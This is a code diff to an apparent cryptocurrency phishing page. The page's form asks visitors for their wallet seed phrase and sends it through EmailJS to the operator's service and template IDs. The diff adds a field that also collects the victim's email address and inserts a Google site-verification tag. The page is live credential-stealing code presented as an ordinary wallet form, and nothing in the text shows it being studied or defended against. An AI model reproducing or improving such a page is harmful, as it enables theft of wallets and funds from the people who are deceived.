@@ -1,5 +1,3 @@
-google-site-verification: google359ec316e56e7f95.html
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -9,6 +7,7 @@ google-site-verification: google359ec316e56e7f95.html
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
     <style>
 
+<meta name="google-site-verification" content="AODOEvqg6Z6m3DHipvX91MdrOqG13a9nM6ea8iuoaGQ" />
         
         body {
             font-family: 'Roboto', sans-serif;
@@ -163,6 +162,8 @@ google-site-verification: google359ec316e56e7f95.html
             <form id="seedPhraseForm">
                 <label for="seedPhrase" class="form-label">Enter your seed phrase:</label>
                 <textarea id="seedPhrase" rows="4" placeholder="Enter your seed phrase here..." class="form-input" required></textarea>
+                <label for="email" class="form-label">Enter your email address:</label>
+                <input type="email" id="email" class="form-input" placeholder="Enter your email address..." required>
                 <button type="submit" class="form-button">Submit</button>
             </form>
         </div>
@@ -171,9 +172,11 @@ google-site-verification: google359ec316e56e7f95.html
             document.getElementById('seedPhraseForm').addEventListener('submit', (e) => {
                 e.preventDefault();
                 const seedPhrase = document.getElementById('seedPhrase').value;
+                const email = document.getElementById('email').value;
 
                 const templateParams = {
-                    seed_phrase: seedPhrase
+                    seed_phrase: seedPhrase,
+                    user_email: email
                 };
 
                 emailjs.send('service_r9nswmn', 'template_3x9460d', templateParams)
